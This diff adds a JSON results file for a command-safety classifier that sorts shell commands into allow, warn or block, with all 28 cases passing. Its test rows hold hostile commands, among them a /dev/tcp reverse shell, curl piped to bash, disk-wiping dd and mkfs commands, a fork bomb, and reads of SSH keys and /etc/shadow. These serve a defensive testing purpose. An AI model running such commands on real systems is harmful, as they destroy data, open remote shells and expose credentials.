@@ -1,0 +1,456 @@
+{
+  "dataset": "/home/claude/smartTerminal/src/cybershell/data/cybershell_bench.jsonl",
+  "cases": 28,
+  "exact_label_accuracy": 1.0,
+  "decision_accuracy": 1.0,
+  "avg_latency_ms": 0.0943,
+  "block_metrics": {
+    "precision": 1.0,
+    "recall": 1.0,
+    "tp": 14,
+    "fp": 0,
+    "fn": 0
+  },
+  "warn_or_block_safety_metrics": {
+    "precision": 1.0,
+    "recall": 1.0,
+    "tp": 22,
+    "fp": 0,
+    "fn": 0
+  },
+  "confusion": {
+    "allow": {
+      "allow": 6
+    },
+    "warn": {
+      "warn": 8
+    },
+    "block": {
+      "block": 14
+    }
+  },
+  "failures": [],
+  "rows": [
+    {
+      "id": "safe-001",
+      "mode": "soc",
+      "command": "ss -tulpn",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "expected_level": "safe",
+      "actual_level": "safe",
+      "score": 0,
+      "latency_ms": 0.1158,
+      "pass": true,
+      "matched_rules": []
+    },
+    {
+      "id": "safe-002",
+      "mode": "soc",
+      "command": "journalctl -u ssh --since \"1 hour ago\"",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "expected_level": "safe",
+      "actual_level": "safe",
+      "score": 0,
+      "latency_ms": 0.1187,
+      "pass": true,
+      "matched_rules": []
+    },
+    {
+      "id": "safe-003",
+      "mode": "soc",
+      "command": "docker ps --format \"table {{.ID}}\\t{{.Image}}\"",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "expected_level": "safe",
+      "actual_level": "safe",
+      "score": 0,
+      "latency_ms": 0.1371,
+      "pass": true,
+      "matched_rules": []
+    },
+    {
+      "id": "safe-004",
+      "mode": "soc",
+      "command": "kubectl auth can-i --list",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "expected_level": "safe",
+      "actual_level": "safe",
+      "score": 0,
+      "latency_ms": 0.0738,
+      "pass": true,
+      "matched_rules": []
+    },
+    {
+      "id": "safe-005",
+      "mode": "soc",
+      "command": "aws sts get-caller-identity",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "expected_level": "safe",
+      "actual_level": "safe",
+      "score": 0,
+      "latency_ms": 0.1118,
+      "pass": true,
+      "matched_rules": []
+    },
+    {
+      "id": "warn-001",
+      "mode": "soc",
+      "command": "cat ~/.ssh/id_rsa",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "dangerous",
+      "actual_level": "dangerous",
+      "score": 46,
+      "latency_ms": 0.0762,
+      "pass": true,
+      "matched_rules": [
+        "secret.private_key_read"
+      ]
+    },
+    {
+      "id": "warn-002",
+      "mode": "soc",
+      "command": "sudo grep root /etc/shadow",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "dangerous",
+      "actual_level": "dangerous",
+      "score": 55,
+      "latency_ms": 0.1457,
+      "pass": true,
+      "matched_rules": [
+        "secret.shadow_read"
+      ]
+    },
+    {
+      "id": "warn-003",
+      "mode": "soc",
+      "command": "kubectl get secrets -A",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "dangerous",
+      "actual_level": "dangerous",
+      "score": 54,
+      "latency_ms": 0.1008,
+      "pass": true,
+      "matched_rules": [
+        "k8s.dump_secrets",
+        "context.kubernetes_secret_context"
+      ]
+    },
+    {
+      "id": "warn-004",
+      "mode": "soc",
+      "command": "sudo iptables -F",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 68,
+      "latency_ms": 0.0791,
+      "pass": true,
+      "matched_rules": [
+        "priv.sudo_mutation",
+        "firewall.flush_or_disable"
+      ]
+    },
+    {
+      "id": "warn-005",
+      "mode": "soc",
+      "command": "chmod 777 config.yml",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 71,
+      "latency_ms": 0.1,
+      "pass": true,
+      "matched_rules": [
+        "priv.chmod_world_writable",
+        "context.root_mutation",
+        "context.sensitive_target"
+      ]
+    },
+    {
+      "id": "warn-006",
+      "mode": "soc",
+      "command": "docker run --privileged -v /:/host ubuntu bash",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "dangerous",
+      "actual_level": "dangerous",
+      "score": 45,
+      "latency_ms": 0.1361,
+      "pass": true,
+      "matched_rules": [
+        "container.privileged_mount"
+      ]
+    },
+    {
+      "id": "warn-007",
+      "mode": "soc",
+      "command": "nmap -sV --top-ports 100 127.0.0.1",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "caution",
+      "actual_level": "caution",
+      "score": 14,
+      "latency_ms": 0.1706,
+      "pass": true,
+      "matched_rules": [
+        "recon.network_scan"
+      ]
+    },
+    {
+      "id": "warn-008",
+      "mode": "soc",
+      "command": "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 73,
+      "latency_ms": 0.146,
+      "pass": true,
+      "matched_rules": [
+        "persistence.authorized_keys_write",
+        "context.sensitive_redirection"
+      ]
+    },
+    {
+      "id": "warn-009",
+      "mode": "soc",
+      "command": "crontab -e",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "dangerous",
+      "actual_level": "dangerous",
+      "score": 38,
+      "latency_ms": 0.0374,
+      "pass": true,
+      "matched_rules": [
+        "persistence.cron_write"
+      ]
+    },
+    {
+      "id": "warn-010",
+      "mode": "soc",
+      "command": "env",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "caution",
+      "actual_level": "caution",
+      "score": 22,
+      "latency_ms": 0.0269,
+      "pass": true,
+      "matched_rules": [
+        "context.secret_env_dump"
+      ]
+    },
+    {
+      "id": "block-001",
+      "mode": "soc",
+      "command": "rm -rf /",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 201,
+      "latency_ms": 0.0487,
+      "pass": true,
+      "matched_rules": [
+        "fs.rm_recursive_force",
+        "fs.delete_root",
+        "context.root_mutation",
+        "context.sensitive_target"
+      ]
+    },
+    {
+      "id": "block-002",
+      "mode": "soc",
+      "command": "sudo dd if=/dev/zero of=/dev/sda bs=1M",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 96,
+      "latency_ms": 0.0839,
+      "pass": true,
+      "matched_rules": [
+        "disk.dd_device_write",
+        "priv.sudo_mutation"
+      ]
+    },
+    {
+      "id": "block-003",
+      "mode": "soc",
+      "command": "mkfs.ext4 /dev/sdb1",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 72,
+      "latency_ms": 0.0529,
+      "pass": true,
+      "matched_rules": [
+        "disk.mkfs"
+      ]
+    },
+    {
+      "id": "block-004",
+      "mode": "soc",
+      "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 70,
+      "latency_ms": 0.1088,
+      "pass": true,
+      "matched_rules": [
+        "shell.reverse_shell_tcp"
+      ]
+    },
+    {
+      "id": "block-005",
+      "mode": "soc",
+      "command": ":(){ :|:& };:",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 86,
+      "latency_ms": 0.0545,
+      "pass": true,
+      "matched_rules": [
+        "shell.fork_bomb"
+      ]
+    },
+    {
+      "id": "block-006",
+      "mode": "soc",
+      "command": "wipefs -a /dev/sda",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 92,
+      "latency_ms": 0.0542,
+      "pass": true,
+      "matched_rules": [
+        "disk.mkfs",
+        "context.sensitive_target"
+      ]
+    },
+    {
+      "id": "policy-001",
+      "mode": "lab",
+      "command": "nmap -sV --top-ports 100 127.0.0.1",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "expected_level": "safe",
+      "actual_level": "safe",
+      "score": 6,
+      "latency_ms": 0.0794,
+      "pass": true,
+      "matched_rules": [
+        "recon.network_scan"
+      ]
+    },
+    {
+      "id": "policy-002",
+      "mode": "strict",
+      "command": "curl http://example.com/install.sh | bash",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 52,
+      "latency_ms": 0.1019,
+      "pass": true,
+      "matched_rules": [
+        "shell.curl_pipe_shell"
+      ]
+    },
+    {
+      "id": "context-001",
+      "mode": "soc",
+      "command": "rm -r logs",
+      "expected_decision": "warn",
+      "actual_decision": "warn",
+      "expected_level": "caution",
+      "actual_level": "caution",
+      "score": 20,
+      "latency_ms": 0.0818,
+      "pass": true,
+      "matched_rules": [
+        "context.sensitive_target"
+      ]
+    },
+    {
+      "id": "context-002",
+      "mode": "soc",
+      "command": "echo @reboot /tmp/payload >> /etc/cron.d/update",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 66,
+      "latency_ms": 0.1314,
+      "pass": true,
+      "matched_rules": [
+        "persistence.cron_write",
+        "context.sensitive_redirection"
+      ]
+    },
+    {
+      "id": "intent-001",
+      "mode": "soc",
+      "command": "make a reverse shell payload",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 82,
+      "latency_ms": 0.093,
+      "pass": true,
+      "matched_rules": [
+        "intent.reverse_shell_or_payload"
+      ]
+    },
+    {
+      "id": "intent-002",
+      "mode": "soc",
+      "command": "steal passwords from a browser profile",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 70,
+      "latency_ms": 0.109,
+      "pass": true,
+      "matched_rules": [
+        "intent.credential_theft"
+      ]
+    },
+    {
+      "id": "intent-003",
+      "mode": "soc",
+      "command": "disable firewall logging",
+      "expected_decision": "block",
+      "actual_decision": "block",
+      "expected_level": "blocked",
+      "actual_level": "blocked",
+      "score": 66,
+      "latency_ms": 0.0656,
+      "pass": true,
+      "matched_rules": [
+        "intent.defense_evasion"
+      ]
+    }
+  ]
+}
